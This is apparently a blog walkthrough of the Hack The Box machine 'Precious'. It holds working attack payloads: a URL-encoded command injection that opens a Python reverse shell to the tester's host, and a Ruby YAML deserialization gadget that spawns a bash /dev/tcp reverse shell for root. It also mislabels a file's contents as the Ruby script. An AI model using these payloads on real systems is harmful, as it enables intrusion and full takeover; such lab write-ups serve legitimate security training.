---
title: Hack The Box - Precious
tags: [HTB, Webapp Exploit, nmap, Python]
layout: post
---

Some Description

## Summary
- Information Gathering
    - Nmap Scanning
- Exploit CVE for Vulnerable Version
- Privilege Escalation

---

## Information Gathering Stage
### Nmap Scanning 
`sudo nmap -sV 10.10.11.189 -p-`

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
## Exploiting Stage
Web redirect to precious.htb → add record to hosts
`echo "10.10.11.189 precious.htb" | sudo tee -a /etc/hosts`
Checking around the machine, we are gather a lot of information useful like: nginx 1.18.0, port 80,22, Function Convert remote file to PDF, ...
Let's check version it! :) We have a traffic to getshell low privilege escalation

*** Check pdf version ***
```sh
#exiftool file_name.pdf 
ExifTool Version Number         : 12.57
File Name                       : file_name.pdf
File Size                       : 23 kB
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
...
Creator                         : Generated by pdfkit v?.?.?
```

Just do google search to getshell.

```bash
http://10.10.14.8/?name='%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`'
```

Get shell → swap user `ruby` to `henry` (credential at .bundle in /homw/Henry folder)

User.txt: `********************************`

## Privilege Escalation

---

Transfer File linpeas.sh

```bash
python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.11.189 - - [19/Apr/2023 22:49:13] "GET /linpeas.sh HTTP/1.1" 200 -
```

SUID

```bash
-rwxr-sr-x 1 root ssh 347K Jul  1  2022 /usr/bin/ssh-agent                                                                                                                                                                                  
-rwxr-sr-x 1 root crontab 43K Feb 22  2021 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry
-rwsr-sr-x 1 root root 1.2M Mar 27  2022 /usr/bin/bash
```

`Sudo -l`

```bash
bash-5.1$ sudo -l

Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby **/opt/update_dependencies.rb**
```

Cat  **`/opt/update_dependencies.rb`**

```bash
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/10.10.14.8/9999 0>&1'"
         method_id: :resolve
```

It execute command at line in the end of file (git_set) → change value into Reverse shell (bash).

### Listen and run file

```bash
nc -nlvp 9999
```

```bash
sudo ruby /opt/update_dependencies.rb
```

Root.txt: `********************************`